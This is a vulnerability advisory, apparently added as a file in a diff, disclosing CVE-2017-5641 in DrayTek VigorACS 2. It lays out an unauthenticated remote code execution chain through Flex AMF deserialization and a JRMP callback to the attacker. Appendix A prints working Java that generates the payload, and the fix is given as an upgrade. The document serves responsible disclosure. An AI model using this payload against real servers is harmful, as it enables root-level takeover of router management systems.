@@ -1,0 +1,122 @@
+>> DrayTek VigorACS 2 Unsafe Flex AMF Java Object Deserialization
+>> Discovered by Pedro Ribeiro (pedrib@gmail.com), Agile Information Security
+=================================================================================
+Disclosure: 18/04/2018 / Last updated: 19/04/2018
+
+
+>> Background and summary
+From the vendor's website [1]:
+"VigorACS 2 is a powerful centralized management software for Vigor Routers and VigorAPs, it is an integrated solution for configuring, monitoring, and maintenance of multiple Vigor devices from a single portal. VigorACS 2 is based on TR-069 standard, which is an application layer protocol that provides the secure communication between the server and CPEs, and allows Network Administrator to manage all the Vigor devices (CPEs) from anywhere on the Internet. VigorACS 2 Central Management is suitable for the enterprise customers with a large scale of DrayTek routers and APs, or the System Integrator who need to provide a real-time service for their customer's DrayTek devices."
+
+VigorACS is a Java application that runs on both Windows and Linux. It exposes a number of servlets / endpoints under /ACSServer, which are used for various functions of VigorACS, such as the management of routers and firewalls using the TR-069 protocol [2].
+
+One of the endpoints exposed by VigorACS, at /ACSServer/messabroker/amf, is an Adobe/Apache Flex service that is reachable by the managed routers and firewalls. This advisory shows that VigorACS uses a Flex version is vulnerable to CVE-2017-5641 [3], a vulnerability related to unsafe Java deserialization for Flex AMF objects, which can be abused to achieve unauthenticated remote code execution as root under Linux or SYSTEM under Windows.
+
+This vulnerability was disclosed under Beyond Security SecuriTeam Secure Disclosure (SSD) programme, which have provided assistance to the vendor throughout the disclosure process [4].
+
+
+>> Technical details:
+Vulnerability: Unsafe Flex AMF Java Object Deserialization
+CVE-2017-5641
+Attack Vector: Remote
+Constraints: None; exploitable by an unauthenticated attacker
+Affected versions: confirmed on v2.2.1; earlier versions most likely affected
+
+By sending an HTTP POST request with random data to /ACSServer/messagebroker/amf, the server will respond with a 200 OK and binary data that includes:
+ ...Unsupported AMF version XXXXX...
+ 
+While in the server logs, a stack trace will be produced that includes the following:
+flex.messaging.io.amf.AmfMessageDeserializer.readMessage ...
+flex.messaging.endpoints.amf.SerializationFilter.invoke ...
+...
+
+A quick Internet search revealed CVE-2017-5641 [3], which clearly states in its description:
+"Previous versions of Apache Flex BlazeDS (4.7.2 and earlier) did not restrict which types were allowed for AMF(X) object deserialization by default. During the deserialization process code is executed that for several known types has undesired side-effects. Other, unknown types may also exhibit such behaviors. One vector in the Java standard library exists that allows an attacker to trigger possibly further exploitable Java deserialization of untrusted data. Other known vectors in third party libraries can be used to trigger remote code execution."
+
+Further reading in [5], [6] and [7] led to proof of concept code (Appendix A) that creates a binary payload that can be exploited to achieve remote code execution through unsafe Java deserialization.
+
+A fully working exploit has been released with this advisory that works in the following way: 
+a) sends an AMF binary payload to /ACSServer/messagebroker/amf as described in [6] to trigger a Java Remote Method Protocol (JRMP) call back to the attacker
+b) receives the JRMP connection with ysoserial's JRMP listener [8]
+c) configures ysoserial to respond with a CommonsCollections5 or CommonsCollections6 payload, as a vulnerable version of Apache Commons 3.1 is in the Java classpath of the server
+d) executes code as root / SYSTEM
+
+The exploit has been tested against the Linux and Windows Vigor ACS 2.2.1, although it requires a ysoserial jar patched for multi argument handling (a separate branch in [8], or alternative a ysoserial patched with CommonsCollections5Chained or CommonsCollections6Chained - see [9]). 
+
+Appendix A contains the Java code used to generate the AMF payload that will be sent in step a). This code is very similar to the one in [6], and it is highly recommended to read that advisory by Markus Wulftange of Code White for a better understanding of this vulnerability.
+
+A copy of the Java source code in Appendix A, together with the actual exploit code and the ysoserial patch needed to enable multi argument handling can be fetched from [10].
+
+
+>> Fix:
+Upgrade to DrayTek VigorACS version 2.2.2 as per the vendor instructions [11].
+
+
+>> Appendix A:
+===
+import flex.messaging.io.amf.MessageBody;
+import flex.messaging.io.amf.ActionMessage;
+import flex.messaging.io.SerializationContext;
+import flex.messaging.io.amf.AmfMessageSerializer;
+import java.io.*;
+
+public class ACSFlex {
+    public static void main(String[] args) {
+        Object unicastRef = generateUnicastRef(args[0], Integer.parseInt(args[1]));
+        // serialize object to AMF message
+        try {
+            byte[] amf = new byte[0];
+            amf = serialize((unicastRef));
+            DataOutputStream os = new DataOutputStream(new FileOutputStream(args[2]));
+            os.write(amf);
+            System.out.println("Done, payload written to " + args[2]);
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+
+    public static Object generateUnicastRef(String host, int port) {
+        java.rmi.server.ObjID objId = new java.rmi.server.ObjID();
+        sun.rmi.transport.tcp.TCPEndpoint endpoint = new sun.rmi.transport.tcp.TCPEndpoint(host, port);
+        sun.rmi.transport.LiveRef liveRef = new sun.rmi.transport.LiveRef(objId, endpoint, false);
+        return new sun.rmi.server.UnicastRef(liveRef);
+    }
+
+    public static byte[] serialize(Object data) throws IOException {
+        MessageBody body = new MessageBody();
+        body.setData(data);
+
+        ActionMessage message = new ActionMessage();
+        message.addBody(body);
+
+        ByteArrayOutputStream out = new ByteArrayOutputStream();
+
+        AmfMessageSerializer serializer = new AmfMessageSerializer();
+        serializer.initialize(SerializationContext.getSerializationContext(), out, null);
+        serializer.writeMessage(message);
+
+        return out.toByteArray();
+    }
+}
+===
+
+
+>> References:
+[1] https://www.draytek.com/en/products/central-management/vigoracs-2/
+[2] https://www.draytek.com/en/faq/faq-vigoracs-si/vigoracs-2/how-to-register-a-cpe-to-vigoracs-2-server/
+[3] https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5641
+[4] https://blogs.securiteam.com/index.php/archives/3681
+[5] https://issues.apache.org/jira/browse/FLEX-35290
+[6] http://codewhitesec.blogspot.ru/2017/04/amf.html
+[7] https://github.com/mbechler/marshalsec
+[8] https://github.com/frohoff/ysoserial
+[9] https://github.com/frohoff/ysoserial/issues/71
+[10] https://github.com/pedrib/PoC/tree/master/exploits/acsPwn
+[11] http://www.draytek.com.tw/ftp/ACS%202/Document/DrayTek_VigorACS%20V2.2.2_01release-note.pdf
+
+
+
+================
+Agile Information Security Limited
+http://www.agileinfosec.co.uk/
+>> Enabling secure digital business >>
